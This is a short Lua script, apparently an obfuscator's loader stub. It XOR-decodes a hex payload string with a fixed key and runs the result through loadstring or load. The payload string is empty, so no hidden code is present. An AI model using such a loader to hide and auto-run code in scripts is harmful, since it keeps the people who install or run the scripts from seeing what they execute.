local k={18,218,124,149,243,250,175,208,176,156,211,193,34,186,86,217,110,123,169,109,219,187,64,48,121,97,76,214,197,167,187,249}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
